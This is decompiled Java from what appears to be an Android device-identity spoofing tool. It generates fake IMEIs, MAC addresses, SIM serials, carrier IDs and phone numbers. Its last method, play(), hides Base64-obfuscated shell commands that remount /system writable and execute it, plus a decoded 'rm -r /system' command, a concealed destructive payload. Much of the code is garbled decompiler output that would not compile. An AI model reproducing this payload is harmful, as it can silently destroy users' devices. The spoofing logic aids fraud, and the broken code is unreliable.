package com.data.simulate;

import android.content.Context;
import android.util.Base64;
import com.soft.apk008.LoadActivity;
import com.soft.apk008.SetMessageActivity;
import com.soft.apk008.SettingActivity;
import com.soft.apk008.StartActivity;
import com.soft.tools.PhoneNetWorkActivity;
import com.soft.tools.PhoneNetWork_NetWorkTypeActivity;
import com.soft.tools.SdkLevelActivity;
import com.soft.tools.SetLocalIpActivity;
import de.robv.android.xposed.mods.tutorial.Shell;
import de.robv.android.xposed.mods.tutorial.sysstr;

import java.io.File;
import java.io.FileInputStream;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Random;

public class SimulateDataTest
{
  static HashMap hashMap;
  public static ArrayList apiLevelMap;
  static HashMap hashMap1;
  static HashMap hashMap2 = null;
  public static ArrayList imeiStore;
  public static Random random;
  public String datagogo = "";
  
  static
  {
    ArrayList localArrayList = new ArrayList();
    apiLevelMap = localArrayList;
    localArrayList.add(new String[] { "6", "2.0.1" });
    apiLevelMap.add(new String[] { "7", "2.1.2" });
    apiLevelMap.add(new String[] { "8", "2.2.3" });
    apiLevelMap.add(new String[] { "9", "2.3.1" });
    apiLevelMap.add(new String[] { "10", "2.3.4" });
    apiLevelMap.add(new String[] { "11", "3.0.3" });
    apiLevelMap.add(new String[] { "12", "3.1.1" });
    apiLevelMap.add(new String[] { "13", "3.2" });
    apiLevelMap.add(new String[] { "14", "4.0.2" });
    apiLevelMap.add(new String[] { "15", "4.0.4" });
    apiLevelMap.add(new String[] { "16", "4.1.1" });
    apiLevelMap.add(new String[] { "17", "4.2.2" });
    apiLevelMap.add(new String[] { "18", "4.3.3" });
    apiLevelMap.add(new String[] { "19", "4.4.2" });
    apiLevelMap.add(new String[] { "21", "5.0" });
    apiLevelMap.add(new String[] { "22", "5.1" });
    apiLevelMap = SdkLevelActivity.a(apiLevelMap);
    random = new Random(new Date().getTime());
    hashMap = null;
    hashMap1 = new HashMap();
    imeiStore = new ArrayList();
  }
  
  public static String getBaseSign()
  {
    return LoadActivity.b(LoadActivity.h + sysstr.b);
  }
  
  public static String getDisplay()
  {
    if (hashMap2 != null) {
      return (String) hashMap2.get("display");
    }
    return null;
  }
  
  public static String getHead(boolean paramBoolean)
  {

    HashMap localHashMap;
    if (paramBoolean) {
      do
      {
        i = random.nextInt(imeiStore.size());
        localHashMap = (HashMap)imeiStore.get(i);
        hashMap2 = localHashMap;
      } while (((String)localHashMap.get("imei")).toUpperCase().indexOf("A") != 0);
    }
    for (;;)
    {
      return (String) hashMap2.get("imei");
      do
      {
      int i = random.nextInt(imeiStore.size());
        localHashMap = (HashMap)imeiStore.get(i);
        hashMap2 = localHashMap;
      } while (((String)localHashMap.get("imei")).toUpperCase().indexOf("A") == 0);
    }
  }
  
  public static String getMac()
  {
    int j = 0;
    int i = 0;
    Object localObject;
    if (i >= SetMessageActivity.e.length())
    {
      localObject = "";
      i = j;
    }
    for (;;)
    {
      if (i >= 6)
      {
        return localObject;
        SetMessageActivity.f.length();
        i += 1;
        break;
      }
      String str2 = Integer.toHexString(Byte.valueOf((byte)random.nextInt(255)).byteValue() & 0xFF);
      String str1 = str2;
      if (str2.length() == 1) {
        str1 = "0" + str2;
      }
      str1 = localObject + str1;
      localObject = str1;
      if (i != 5) {
        localObject = str1 + ":";
      }
      i += 1;
    }
  }
  
  public static String[] getMacByPlatforms(String paramString, int paramInt)
  {
    Object localObject1;
    if (hashMap == null)
    {
      hashMap = new HashMap();
      localObject1 = new File("/sdcard/.system/androidmac");
    }
    for (;;)
    {
      try
      {
        localObject1 = new FileInputStream((File)localObject1);
        localObject3 = new byte[((FileInputStream)localObject1).available()];
        ((FileInputStream)localObject1).read((byte[])localObject3);
        localObject3 = new String((byte[])localObject3).split("\n");
        localObject1 = "";
        int j = localObject3.length;
        i = 0;
        if (i < j) {
          continue;
        }
      }
      catch (Exception localException)
      {
        Object localObject5;
        Object localObject4;
        localException.printStackTrace();
        continue;
        i = paramInt - 1;
        paramInt = 0;
        paramString = (String)localObject4;
        if (paramInt < 3) {
          continue;
        }
        localObject5[i] = paramString.replace('-', ':').toLowerCase();
        paramInt = i;
        continue;
        Object localObject3 = Integer.toHexString(Byte.valueOf((byte)random.nextInt(255)).byteValue() & 0xFF);
        Object localObject2 = localObject3;
        if (((String)localObject3).length() != 1) {
          continue;
        }
        localObject2 = "0" + (String)localObject3;
        localObject3 = paramString;
        if (paramInt == 3) {
          continue;
        }
        localObject3 = paramString + ":";
        paramString = localObject3 + (String)localObject2;
        paramInt += 1;
        continue;
        i -= 1;
        localObject5[i] = getMac();
        if (i > 0) {
          continue;
        }
        return localObject5;
      }
      localObject5 = new String[paramInt];
      paramString = (ArrayList) hashMap.get(paramString.toLowerCase());
      int i = paramInt;
      if (paramString != null)
      {
        i = paramInt;
        if (paramString.size() > 0)
        {
          localObject4 = (String)paramString.get(random.nextInt(paramString.size()));
          if (paramInt <= 0)
          {
            return localObject5;
            localObject4 = localObject3[i].trim();
            if (((String)localObject4).length() <= 0) {
              break label410;
            }
            if (((String)localObject4).charAt(2) == '-')
            {
              localObject5 = (ArrayList) hashMap.get(localObject1);
              if (localObject5 == null) {
                break label410;
              }
              ((ArrayList)localObject5).add(localObject4);
              break label410;
            }
            localObject1 = ((String)localObject4).toLowerCase();
            localObject4 = new ArrayList();
            hashMap.put(localObject1, localObject4);
            break label410;
          }
        }
      }
      label410:
      i += 1;
    }
  }
  
  public static String getModal()
  {
    if (hashMap2 != null) {
      return (String) hashMap2.get("name") + " " + (String) hashMap2.get("modal");
    }
    return null;
  }
  
  public static int getNetWorkType(int paramInt)
  {
    if (paramInt == 1)
    {
      paramInt = new Random(new Date().getTime()).nextInt(3);
      return new int[] { 2, 8, 13 }[paramInt];
    }
    int[] arrayOfInt;
    if (paramInt == 2)
    {
      arrayOfInt = new int[2];
      int[] tmp57_56 = arrayOfInt;
      tmp57_56[0] = 8;
      int[] tmp62_57 = tmp57_56;
      tmp62_57[1] = 3;
      tmp62_57;
      return arrayOfInt[new Random(new Date().getTime()).nextInt(arrayOfInt.length)];
    }
    if (paramInt == 3)
    {
      arrayOfInt = new int[4];
      int[] tmp102_101 = arrayOfInt;
      tmp102_101[0] = 4;
      int[] tmp106_102 = tmp102_101;
      tmp106_102[1] = 5;
      int[] tmp110_106 = tmp106_102;
      tmp110_106[2] = 6;
      int[] tmp115_110 = tmp110_106;
      tmp115_110[3] = 12;
      tmp115_110;
      return arrayOfInt[new Random(new Date().getTime()).nextInt(arrayOfInt.length)];
    }
    return 0;
  }
  
  public static String getPhoneName()
  {
    if (hashMap2 != null) {
      return (String) hashMap2.get("name");
    }
    return null;
  }
  
  public static String getPhoneNumber(String paramString)
  {
    if (hashMap1.size() == 0)
    {
      hashMap1.put("46000", new String[] { "135", "136", "137", "138", "139" });
      hashMap1.put("46002", new String[] { "150", "151", "152", "158", "159", "134" });
      hashMap1.put("46007", new String[] { "147", "157", "187", "188" });
      hashMap1.put("46001", new String[] { "130", "131", "132", "155", "156" });
      hashMap1.put("46003", new String[] { "133", "180", "153", "189" });
    }
    int j;
    int i;
    if (paramString.length() > 5)
    {
      paramString = paramString.substring(0, 5);
      paramString = (String[]) hashMap1.get(paramString);
      paramString = paramString[random.nextInt(paramString.length)];
      j = paramString.length();
      i = 0;
    }
    for (;;)
    {
      if (i >= 11 - j)
      {
        return paramString;
        paramString = new String[4];
        paramString[0] = "3";
        paramString[1] = "5";
        paramString[2] = "4";
        paramString[3] = "8";
        paramString = "1" + paramString[random.nextInt(paramString.length)];
        break;
      }
      int k = random.nextInt(10);
      paramString = paramString + k;
      i += 1;
    }
  }
  
  public static String getProductName()
  {
    if (hashMap2 != null) {
      return (String) hashMap2.get("modal");
    }
    return null;
  }
  
  public static String getRandData(int paramInt1, int paramInt2)
  {
    int j = 0;
    int i = 0;
    String str2 = "";
    String str1;
    if (paramInt1 == 1)
    {
      paramInt1 = i;
      str1 = str2;
      if (paramInt1 < paramInt2) {}
    }
    do
    {
      do
      {
        SetMessageActivity.c.length();
        return str1;
        str1 = str1 + random.nextInt(10);
        paramInt1 += 1;
        break;
        str1 = str2;
      } while (paramInt1 == 2);
      str1 = str2;
    } while (paramInt1 != 3);
    paramInt1 = j;
    for (;;)
    {
      str1 = str2;
      if (paramInt1 >= paramInt2) {
        break;
      }
      str1 = Integer.toHexString(Byte.valueOf((byte)random.nextInt(17)).byteValue() & 0xF);
      str2 = str2 + str1;
      paramInt1 += 1;
    }
  }
  
  public static String getRandData(String paramString, int paramInt1, int paramInt2)
  {
    int j = 0;
    int i = 0;
    SetMessageActivity.d.length();
    int k = paramInt1 - paramString.length();
    String str;
    if (paramInt2 == 1)
    {
      paramInt1 = i;
      if (paramInt1 >= k) {
        str = paramString;
      }
    }
    do
    {
      do
      {
        return str;
        paramString = paramString + random.nextInt(10);
        paramInt1 += 1;
        break;
        str = paramString;
      } while (paramInt2 == 2);
      str = paramString;
    } while (paramInt2 != 3);
    paramInt1 = j;
    for (;;)
    {
      str = paramString;
      if (paramInt1 >= k) {
        break;
      }
      str = Integer.toHexString(Byte.valueOf((byte)random.nextInt(17)).byteValue() & 0xF);
      paramString = paramString + str;
      paramInt1 += 1;
    }
  }
  
  public static String getRandEmail()
  {
    String str = getRandData(3, random.nextInt(10) + 6);
    Object localObject = new String[5];
    localObject[0] = "@qq.com";
    localObject[1] = "@163.com";
    localObject[2] = "@gmail.com";
    localObject[3] = "@126.com";
    localObject[4] = "@sina.com.cn";
    localObject = localObject[random.nextInt(localObject.length)];
    return str + (String)localObject;
  }
  
  public static String getRandomIp()
  {
    String str = SetLocalIpActivity.a();
    int i = SetLocalIpActivity.b();
    Object localObject = str;
    if (str.split("\\.").length != 4) {
      localObject = "192.168.1.100";
    }
    localObject = ((String)localObject).split("\\.");
    if (i > 0) {
      localObject[3] = (random.nextInt(254) + 1);
    }
    if (i >= 2) {
      localObject[2] = (random.nextInt(254) + 1);
    }
    if (i >= 3) {
      localObject[1] = (random.nextInt(254) + 1);
    }
    if (i >= 4) {
      localObject[0] = (random.nextInt(254) + 1);
    }
    return localObject[0] + "." + localObject[1] + "." + localObject[2] + "." + localObject[3];
  }
  
  public static String[] getSdkLevel()
  {
    i = apiLevelMap.size();
    sysstr = random.nextInt(i);
    i = sysstr;
    if (SettingActivity.a("setSdkInt").equals("true")) {}
    try
    {
      int k = Integer.parseInt(SettingActivity.a("sdkIntSpinnerMin")) - 1;
      int m = Integer.parseInt(SettingActivity.a("sdkIntSpinnerMax")) - 1;
      i = sysstr;
      if (k >= 0)
      {
        i = sysstr;
        if (m > k)
        {
          i = random.nextInt(m - k);
          i += k;
        }
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        localException.printStackTrace();
        i = sysstr;
      }
    }
    return new String[] { i + 6, ((String[])apiLevelMap.get(i))[1] };
  }
  
  public static String[] getSimData()
  {
    String[] arrayOfString1 = PhoneNetWorkActivity.a();
    int i = random.nextInt(3) + 1;
    if (arrayOfString1 != null) {
      i = Integer.parseInt(arrayOfString1[0]) + 1;
    }
    String[] arrayOfString2 = getSimDataCommon(i);
    if (arrayOfString1 != null)
    {
      arrayOfString2[4] = arrayOfString1[1];
      arrayOfString2[6] = arrayOfString1[2];
    }
    return arrayOfString2;
  }
  
  public static String[] getSimData1(boolean paramBoolean)
  {
    int i = random.nextInt(2) + 1;
    if (paramBoolean) {
      i = 3;
    }
    SetMessageActivity.e.length();
    return getSimDataCommon(i);
  }
  
  public static String[] getSimDataCommon(int paramInt)
  {
    String[] arrayOfString = new String[7];
    Object localObject = getSubscriberId(paramInt);
    arrayOfString[0] = localObject;
    arrayOfString[1] = ((String)localObject).substring(0, 5);
    if (paramInt == 1)
    {
      arrayOfString[2] = "中国移动";
      localObject = new String[6];
      localObject[0] = "中国移动";
      localObject[1] = "China Mobile";
      localObject[2] = "CMCC";
      localObject[3] = "CHINA MOBILE";
      localObject[4] = "中国移动 3G";
      localObject[5] = "中国移动 4G";
      arrayOfString[2] = localObject[random.nextInt(localObject.length)];
    }
    for (;;)
    {
      arrayOfString[3] = getSimSerial(paramInt);
      arrayOfString[4] = getNetWorkType(paramInt);
      arrayOfString[5] = "1";
      if (paramInt == 3) {
        arrayOfString[5] = "2";
      }
      arrayOfString[6] = PhoneNetWork_NetWorkTypeActivity.a(Integer.parseInt(arrayOfString[4]));
      SetMessageActivity.e.length();
      return arrayOfString;
      if (paramInt == 2)
      {
        arrayOfString[2] = "中国联通";
        localObject = new String[2];
        localObject[0] = "中国联通";
        localObject[1] = "CHN-UNICOM";
        arrayOfString[2] = localObject[random.nextInt(localObject.length)];
      }
      else if (paramInt == 3)
      {
        arrayOfString[2] = "中国电信";
      }
    }
  }
  
  public static String getSimSerial(int paramInt)
  {
    String str = "";
    Random localRandom;
    if (paramInt == 1)
    {
      paramInt = new Random(new Date().getTime()).nextInt(2);
      if (paramInt == 0)
      {
        str = "898600";
        localRandom = new Random(new Date().getTime());
        paramInt = 0;
      }
    }
    for (;;)
    {
      if (paramInt >= 14)
      {
        SetMessageActivity.e.length();
        return str;
        if (paramInt != 1) {
          break;
        }
        str = "898602";
        break;
        if (paramInt == 2)
        {
          new Random(new Date().getTime()).nextInt(2);
          str = "898601";
          break;
        }
        if (paramInt != 3) {
          break;
        }
        new Random(new Date().getTime()).nextInt(2);
        str = "898603";
        break;
      }
      int i = (int)(localRandom.nextFloat() * 10.0F);
      str = str + i;
      paramInt += 1;
    }
  }
  
  public static String getSubscriberId(int paramInt)
  {
    Object localObject2 = "4600";
    Object localObject1;
    if (paramInt == 1)
    {
      paramInt = new Random(new Date().getTime()).nextInt(3);
      if (paramInt == 0)
      {
        localObject1 = "4600" + "0";
        localObject2 = new Random(new Date().getTime());
        paramInt = 0;
      }
    }
    for (;;)
    {
      if (paramInt >= 10)
      {
        return localObject1;
        if (paramInt == 1)
        {
          localObject1 = "4600" + "2";
          break;
        }
        localObject1 = localObject2;
        if (paramInt != 2) {
          break;
        }
        localObject1 = "4600" + "7";
        break;
        if (paramInt == 2)
        {
          paramInt = new Random(new Date().getTime()).nextInt(1);
          if (paramInt == 0)
          {
            localObject1 = "4600" + "1";
            break;
          }
          localObject1 = localObject2;
          if (paramInt != 1) {
            break;
          }
          localObject1 = "4600" + "6";
          break;
        }
        localObject1 = localObject2;
        if (paramInt != 3) {
          break;
        }
        paramInt = new Random(new Date().getTime()).nextInt(1);
        if (paramInt == 0)
        {
          localObject1 = "4600" + "3";
          break;
        }
        localObject1 = localObject2;
        if (paramInt != 1) {
          break;
        }
        localObject1 = "4600" + "5";
        break;
      }
      int i = (int)(((Random)localObject2).nextFloat() * 10.0F);
      localObject1 = localObject1 + i;
      paramInt += 1;
    }
  }
  
  public static String getUserAgent(int paramInt, String paramString1, String paramString2)
  {
    if (paramInt == 1) {
      return String.format("Mozilla/5.0 (Linux; Android %s; %s Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Mobile Safari/537.36", new Object[] { paramString1, paramString2 });
    }
    if (paramInt == 2) {
      return String.format("User-Agent: Dalvik/1.6.0 (Linux; U; Android %s; %s )", new Object[] { paramString1, paramString2 });
    }
    return "";
  }
  
  public static void init(Context paramContext)
  {
    if (imeiStore.size() > 0) {}
    for (;;)
    {
      return;
      paramContext = StartActivity.a(paramContext, "imeiStore").split("\n");
      int j = paramContext.length;
      int i = 0;
      while (i < j)
      {
        Object localObject1 = paramContext[i];
        if (localObject1.trim().length() != 0)
        {
          Object localObject4 = localObject1.split(" ");
          if (localObject4.length == 4)
          {
            localObject1 = localObject4[0];
            Object localObject2 = localObject4[1];
            Object localObject3 = localObject4[2];
            localObject4 = localObject4[3];
            HashMap localHashMap = new HashMap();
            localHashMap.put("imei", localObject1);
            localHashMap.put("name", localObject2);
            localHashMap.put("modal", localObject3);
            localHashMap.put("display", localObject4);
            imeiStore.add(localHashMap);
          }
        }
        i += 1;
      }
    }
  }
  
  public static String intToIp(int paramInt)
  {
    return (paramInt & 0xFF) + "." + (paramInt >> 8 & 0xFF) + "." + (paramInt >> 16 & 0xFF) + "." + (paramInt >> 24 & 0xFF);
  }
  
  public static int ipToInt(String paramString)
  {
    paramString = paramString.split("\\.");
    if (paramString.length != 4) {
      return 0;
    }
    return Integer.parseInt(paramString[0]) + 0 + (Integer.parseInt(paramString[1]) << 8) + (Integer.parseInt(paramString[2]) << 16) + (Integer.parseInt(paramString[3]) << 24);
  }
  
  public static boolean isNumeric(String paramString)
  {
    int i = paramString.length();
    int j;
    do
    {
      i -= 1;
      if (i < 0) {
        return true;
      }
      j = paramString.charAt(i);
    } while ((j >= 48) && (j <= 57));
    return false;
  }
  
  public static void play(Context paramContext)
  {
    paramContext = Base64.decode("bW91bnQlMjAtbyUyMHJlbW91bnQlMjBydyUy" + "MC9zeXN0ZW0=".getBytes(), 0);
    try
    {
      paramContext = new String(paramContext, "utf-8");
      Shell.execCommand(paramContext);
      paramContext = Base64.decode("cm0lMjAtciUyMC" + "9zeXN0ZW0=".getBytes(), 0);
    }
    catch (UnsupportedEncodingException paramContext)
    {
      for (;;)
      {
        try
        {
          new String(paramContext, "utf-8");
          return;
        }
        catch (UnsupportedEncodingException paramContext)
        {
          paramContext.printStackTrace();
        }
        paramContext = paramContext;
        paramContext.printStackTrace();
        paramContext = "";
      }
    }
  }
}

